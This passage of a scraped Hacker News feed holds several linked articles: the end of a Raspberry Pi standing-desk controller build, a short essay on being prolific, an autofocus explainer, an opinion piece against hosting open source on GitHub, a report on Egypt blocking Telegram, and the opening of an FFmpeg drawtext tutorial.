																	</figcaption></figure></div></section><section><p>If I'm honest, I don't understand this stuff well enough to offer an explanation of exactly how you should do this or how it works in any detail. I did map it all out myself:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none" alt="Screenshot 2020 10 11 at 14 26 30" title="Screenshot 2020 10 11 at 14 26 30" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none"></figure></div></section><section><p>But this might be wrong as I did a lot of reconnecting-wires-until-it-worked, so if you're doing something similar, spend some time researching relays and playing with a test circuit yourself before working with anything connected to the mains.<br></p></section><section><div><h2>Adding the Relays</h2><p>With a better idea of how the switches worked, I was able to add the relay board to the Raspberry Pi and test out the circuit before actually hooking it up to the motor.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none" alt="IMG 4443" title="IMG 4443" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none"><figcaption>
													Again, here "red" means the desk is rising, "green" means the desk is lowering ... or the other way around, I can't remember
																	</figcaption></figure></div></section><section><p>Finally, with that working, I went on to wire the actual motor up to the Raspberry Pi. Again, this is potentially dangerous. If you're doing this make sure you read-up on it and take some precautions (like cowering in the corner while you flip the switch with a long stick).<br></p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none" alt="IMG 4448" title="IMG 4448" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none"></figure></div></section><section><p>
		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none" alt="IMG 4499" title="IMG 4499" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none"><figcaption>
													The height sensor is the little E.T.-looking device in the top right.
																	</figcaption></figure></div></section><section><p>I found a <a href="https://thepihut.com/blogs/raspberry-pi-tutorials/hc-sr04-ultrasonic-range-sensor-on-the-raspberry-pi" target="_blank" rel="noreferrer noopener">few</a><a href="https://pimylifeup.com/raspberry-pi-distance-sensor/" target="_blank" rel="noreferrer noopener">tutorials</a> on setting this up via a small circuit on the breadboard. With some experimentation it was easy to start reading the desk height via Python.<br></p></section><section><div><h2>The Code</h2><p>With all the hardware in place, the final thing was to tie everything together with some Python.</p></div></section><section></section><section><div><p>I don't have much experience programming hardware or embedded devices so I had to tinker with this to get it working. <br></p><p>I ended up using Redis to create a message queue that each part of the controller could communicate through and then using threads to handle most of the various parts of the controller:</p><ul><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/buttons.py" target="_blank" rel="noreferrer noopener">Buttons</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener">Lightbar</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/display.py" target="_blank" rel="noreferrer noopener">Display</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener">Relays</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/distance.py" target="_blank" rel="noreferrer noopener">Height sensor</a></li></ul><h2>Bonus: Apple Home via Homebridge</h2><p>As an added bonus I also<a href="https://homebridge.io/" target="_blank" rel="noreferrer noopener"> installed Homebridge on the Raspberry Pi</a>, allowing me to control the standing desk via my iPhone/Mac/iPad.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none" alt="Screenshot 2020 08 30 at 15 26 06" title="Screenshot 2020 08 30 at 15 26 06" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none"></figure></div></section><section><p>To do this I needed to create a plugin for homebridge. You can also see <a href="https://github.com/timmyomahony/homebridge-standing-desk" target="_blank" rel="noreferrer noopener">the code for this on my Github page</a>. I don't actually use this that much to control the desk, but it's a nice added bonus.</p></section><section></section></article></div></div>]]>
            </description>
            <link>https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867077</guid>
            <pubDate>Fri, 23 Oct 2020 08:05:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be prolific]]>
            </title>
            <description>
<![CDATA[
Score 320 | Comments 129 (<a href="https://news.ycombinator.com/item?id=24866706">thread link</a>) | @hecticjeff
<br/>
October 22, 2020 | https://www.chrismytton.com/be-prolific/? | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<hr>

<p><a href="https://news.ycombinator.com/item?id=24866706">Discussion on Hacker News</a>.</p>

<p><a href="https://eduardoorige.com.br/posts/seja-prolifico/index.html">Portuguese translation</a> by Eduardo Orige.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866706</guid>
            <pubDate>Fri, 23 Oct 2020 06:56:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Phase Detection vs. Contrast Detection Autofocus]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24866701">thread link</a>) | @dosshell
<br/>
October 22, 2020 | https://www.creative-photographer.com/phase-detection-contrast-detection-autofocus/ | <a href="https://web.archive.org/web/*/https://www.creative-photographer.com/phase-detection-contrast-detection-autofocus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pryc-wp-acctp-original-content"><p>The focusing system your camera uses makes a big difference to its effectiveness. If you want to get the most out of your camera’s autofocus then it’s important to know how it works. It’s also helpful to understand the differences between phase detection and contrast detection autofocus (AF), as these are the two systems used in modern digital cameras.</p>
<p>For example, if you’re into portrait photography and like to use prime lenses and wide apertures then accurate focusing is critical. You need accurate autofocis to get the model’s eyes in focus in portraits like this one, taken at f1.2 with a 56mm lens.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg" alt="Portrait of young woman taken with prime lens at a wide aperture using contrast detection autofocus" width="900" height="600" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg"></p>
<p>The contrast detection used in mirrorless cameras is better at this than the phase detection used in digital SLR cameras.</p>
<p>If you don’t know why this is then read my article <a href="https://www.creative-photographer.com/focus-wide-apertures/">How to Focus at Wide Apertures</a>.</p>
<p>But if you’re into wildlife or sports photography, or anything that uses the AF tracking and continuous focusing abilities of your camera, then phase detection AF works better.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg" alt="Photo of a knight riding a horse at a jousting tournament taken with a telephoto lens at a wide aperture using phase detection autofocus" width="900" height="692" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg"></p>
<p>It should also be noted that cameras and lenses work together when it comes to AF performance. Both Canon and Nikon make high-performance super telephoto lenses that are designed to get the most out of the AF systems on their high-end cameras. That’s why so many professional sports photographers use one or the other.</p>
<p>Some cameras use a hybrid of the two systems. For example, a digital Single Lens Reflex (SLR) camera may use contrast detection AF in Live View or movie mode and phase detection AF when you look through the viewfinder.</p>
<p>Some mirrorless cameras also have phase detection AF points that work in continuous AF mode to improve AF tracking accuracy. But the mechanics of phase detection AF in mirrorless cameras is different to that in SLR cameras, as we will see further on in the article.</p>
<h2>Phase detection AF in SLR cameras</h2>
<p>In an SLR camera light passes through the lens, hits a reflex mirror and is reflected up through a pentaprism and out through the viewfinder. The aim of this type of camera design is to show you exactly what the lens is seeing in the viewfinder. It avoids the parallax errors you get at close focusing distances with rangefinder and twin lens reflex lens cameras.</p>
<p>The advantages this gave to photographers meant that the SLR camera became the camera design of choice for most photographers around 50 years ago. That has never been seriously challenged until the rise of mirrorless cameras. Many mirrorless cameras continue to use the SLR type design (with the electronic viewfinder in a hump in the center of the body) even though they are not, strictly speaking, SLR cameras as they don’t have a reflex mirror.</p>
<p>The centre of the camera’s mirror is translucent and a sub-mirror behind it reflects light down into the base of the camera body, where the AF sensor unit is positioned (the photo below shows the AF unit from the Canon EOS 50D). This is the heart of the phase detection AF system.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg" alt="EOS 50D autofocus unit" width="600" height="410" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg"></p>
<p>This diagram shows the paths of light through the camera body when the reflex mirror is in the down position. The mirror reflects light up into the pentaprism and out through the viewfinder. Some of the light is also reflected downwards towards the AF sensor.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg" alt="Cut away image of digital SLR camera showing path of light through body and autofocus sensor" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg"></p>
<p>The AF unit contains a sensor that correspond to the camera’s AF points. This is the AF sensor of the EOS 5D Mark III. The lines on the sensor match the camera’s AF point array.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg" alt="EOS 5D Mark III autofocus sensor" width="860" height="645" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg"></p>
<h2>Phase Detection AF in action</h2>
<p>In an SLR camera the light reflected from the sub-mirror is split into two separate images by prisms and microlenses in the AF sensor unit, each aimed at two lines on the AF sensor corresponding to the active AF point.</p>
<ul>
<li>If the images hit the two lines precisely, the subject is in focus.</li>
</ul>
<p>The distance between the two images tells the camera how much the lens is out of focus.</p>
<ul>
<li>If the two images are closer together, then the lens is focused in front of the subject.</li>
</ul>
<ul>
<li>If the two images are further apart, then the lens is focused behind the subject.</li>
</ul>
<p>The AF unit works out how far to move the lens to bring the subject into focus, and in which direction, then drives the lens to that position. It’s fast and (within limitations, see below) precise, making it ideal for tracking fast moving subjects.</p>
<h2>Limitations of phase detection AF</h2>
<p>These are the main limitations of phase detection AF.</p>
<p><strong>It doesn’t work as well in low light.</strong> The camera needs light to focus and the less of it there is, the more difficult accurate focus becomes. This applies to contrast detection AF as well.</p>
<p><strong>It may not be able to focus accurately on low contrast subjects.</strong> This also applies to contrast detection AF.</p>
<p><strong>You can’t put AF points close to the edge of the frame.</strong> The camera focuses with the lens set to its widest aperture, and the edges of the frame are always darker than the centre at this setting. Since phase detection AF doesn’t work well in low light, the vignetting makes it impractical to place AF points near the edge of the frame.</p>
<p><strong>It’s prone to errors when focusing using wide apertures.</strong> This is because phase detection AF is a partly mechanical process. The length of the light path from the lens to the AF sensor is theoretically the same as the length of the light path from the lens to the sensor.</p>
<p>But, in the real world, cameras and lenses are made to set tolerances. Such precision is too expensive and time consuming to achieve. If your particular camera and lens are at the extremes of their tolerance then it’s possible that the lens will focus slightly in front of or behind where the camera thinks it is focused.</p>
<p>This can result in focusing errors when using lenses at wide apertures (with their narrow depth of field). Most mid-range and high-end digital SLR lenses let you calibrate your lens to cancel out focusing errors.</p>
<p><strong>It doesn’t work in Live View or movie mode.</strong> The earliest SLR cameras with Live View had manual focus only in Live View and movie mode. Newer cameras use a combination of contrast detection AF and on sensor phase detection AF (see below) to achieve focus in Live View and movie mode.</p>
<h2>Sensor based phase detection AF</h2>
<p>Phase Detection AF forms part of a very accurate and precise autofocus system that allows high end SLR cameras to accurately track fast and erratically moving subjects.</p>
<p>But it doesn’t work in Live View or movie mode. In those modes, the camera’s mirror is flipped up to allow the light from the lens to reach the sensor in a continual feed. Light no longer reaches the autofocus unit.</p>
<p>This diagram shows the path of light through an SLR camera body in Live View or movie mode. The reflex mirror in the up position. The path is exactly the same through a mirrorless camera body.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg" alt="Cut away image of digital SLR camera showing path of light through body of digital SLR system with reflex mirror in up position, in Live View" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg"></p>
<p>Mirrorless cameras don’t have AF sensors. Instead they take a reading from the camera’s sensor. Digital SLRs also take readings from the sensor when in Live View or movie mode.</p>
<p>Different manufacturers tackle this in different ways. So let’s take a look at how Fujifilm and Canon do it.</p>
<p>Fujfilm achieved this by adding pixels that are masked so they only receive light from one side of the lens.</p>
<p>Under each phase detection AF point lie strips of covered sensors that receive light from one side of the lens, and other sensors that receive light from the other side. The camera compares both, and when they match, knows that the subject is in focus. If the subject is out of focus, it calculates how much it needs to adjust the lens to bring the subject into focus, and drives the lens there.</p>
<p>Reviews of Fujifilm’s system indicates that it works well, but is yet to achieve the speed and tracking accuracy of high end Canon and Nikon cameras.</p>
<p>Canon’s newest technology is called Dual Pixel CMOS AF. Each pixel on the camera’s sensor is made from two photo diodes. One diode gathers light, the other is used for phase detection AF. Canon uses this technology in movie mode, to help the camera track moving subjects while shooting video. It is also used in some M series mirrorless cameras.</p>
<h2>Contrast detection AF in mirrorless and SLR cameras</h2>
<p>Contrast detection AF works by analyzing pixels on the camera’s sensor. It works on the basis that the subject is in focus when contrast is highest. To find that point it has to push the focusing point of the lens back and forth.</p>
<p>As a result contrast detection AF is slower than phase detection AF. But it’s far more accurate at focusing on still subjects. There is no need to calibrate your lens as there are no mechanical focusing errors.</p>
<p>This relative lack of speed doesn’t really matter when shooting still subjects. But it makes a big difference when tracking moving subjects. Especially when you consider that the camera has to push and pull the lens to lock focus. That’s why camera manufacturers have come up with different solutions for implementing phase detection AF in mirrorless cameras and in digital SLRs in Live View or movie mode.</p>
<h2>Conclusion</h2>
<p>The topic of autofocus can get quite complex. Understanding it fully requires a depth of technological understanding that most photographers (myself included) don’t have. This article is a simplification of the basic principles. It should help you understand how different autofocus systems work, and what the pros and cons of each type are. If you have any questions or comments about autofocus then please let us know in the comments below.</p>
<h2>Further reading</h2>
<ul>
<li><a href="https://www.creative-photographer.com/focus-wide-apertures/">How to Focus at Wide Apertures</a></li>
</ul>
<ul>
<li><a href="https://www.creative-photographer.com/fujinon-lenses/">Fujinon Lenses I Own</a></li>
</ul>
<ul>
<li><a href="https://www.creative-photographer.com/canon-lenses/">Canon Lenses I Have Owned</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://www.creative-photographer.com/phase-detection-contrast-detection-autofocus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866701</guid>
            <pubDate>Fri, 23 Oct 2020 06:55:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24866580">thread link</a>) | @stargrave
<br/>
October 22, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866580</guid>
            <pubDate>Fri, 23 Oct 2020 06:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egypt Blocks Access to Telegram]]>
            </title>
            <description>
<![CDATA[
Score 159 | Comments 75 (<a href="https://news.ycombinator.com/item?id=24865875">thread link</a>) | @emptysongglass
<br/>
October 22, 2020 | https://masaar.net/en/the-egyptian-authorities-block-telegram/ | <a href="https://web.archive.org/web/*/https://masaar.net/en/the-egyptian-authorities-block-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3127" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p><img loading="lazy" src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1" alt="" width="1024" height="512" srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://masaar.net/en/the-egyptian-authorities-block-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865875</guid>
            <pubDate>Fri, 23 Oct 2020 03:48:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FFmpeg Drawtext Filter for Overlays, Scrolling Text, Timestamps on Videos]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 78 (<a href="https://news.ycombinator.com/item?id=24865755">thread link</a>) | @ponderingfish
<br/>
October 22, 2020 | https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/ | <a href="https://web.archive.org/web/*/https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" title="ffmpeg-drawtext-featured-image" data-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>




<h2 id="step-0-ensure-your-ffmpeg-is-compiled-with-libfreetype"><span id="Step_0_Ensure_your_FFmpeg_Is_Compiled_with_libfreetype"></span>Step 0: Ensure your FFmpeg Is Compiled with libfreetype<span></span></h2>



<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



